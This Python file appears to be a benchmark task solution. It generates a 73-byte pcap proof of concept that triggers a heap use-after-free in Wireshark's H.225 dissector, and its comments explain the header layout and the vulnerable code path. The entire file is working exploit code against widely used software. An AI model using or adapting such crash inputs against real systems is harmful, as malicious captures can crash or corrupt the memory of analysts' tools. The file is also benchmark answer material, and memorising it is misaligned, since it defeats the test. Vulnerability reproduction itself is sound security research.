import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free in h225 dissector.
        Targeting the 'h225' dissector using LINKTYPE_WIRESHARK_UPPER_PDU to minimize size 
        and directly invoke the vulnerable code path.
        
        Ground-truth length is 73 bytes.
        Breakdown:
        - Global Header: 24 bytes
        - Packet Header: 16 bytes
        - Upper PDU Headers: 13 bytes (Tag/Len + 'h225\0' + EndTag/Len)
        - Payload: 20 bytes
        Total: 73 bytes
        """
        
        # 1. PCAP Global Header
        # Magic (0xa1b2c3d4) indicates microsecond timestamp resolution and little-endian byte order
        # Version 2.4, Zone 0, SigFigs 0, SnapLen 65535
        # Network 252 corresponds to LINKTYPE_WIRESHARK_UPPER_PDU
        global_header = struct.pack('<IHHIIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 252)
        
        # 2. Upper PDU Protocol Info
        # Defines the dissector to be called ("h225")
        # Structure: Tag (2B), Length (2B), Value (N bytes)
        # EXP_PDU_TAG_DISSECTOR_NAME = 12
        proto_name = b'h225\x00'
        # Upper PDU tags are Big-Endian
        pdu_info = struct.pack('>HH', 12, len(proto_name)) + proto_name
        
        # EXP_PDU_TAG_END_OF_OPT = 0
        pdu_info += struct.pack('>HH', 0, 0)
        
        # 3. H.225 Payload
        # The vulnerability involves `next_tvb_add_handle` and missing initialization in `dissect_h225_h225_RasMessage`.
        # We provide 20 bytes of zeros. In ASN.1 PER, this parses as a RasMessage (likely GatekeeperRequest) 
        # and allows the dissector to proceed, triggering the state corruption/UAF upon repeated execution.
        payload = b'\x00' * 20
        
        full_packet_data = pdu_info + payload
        
        # 4. PCAP Packet Header
        # Timestamp (0,0), Captured Length, Original Length
        # Little-Endian matching the global header
        packet_header = struct.pack('<IIII', 0, 0, len(full_packet_data), len(full_packet_data))
        
        return global_header + packet_header + full_packet_data
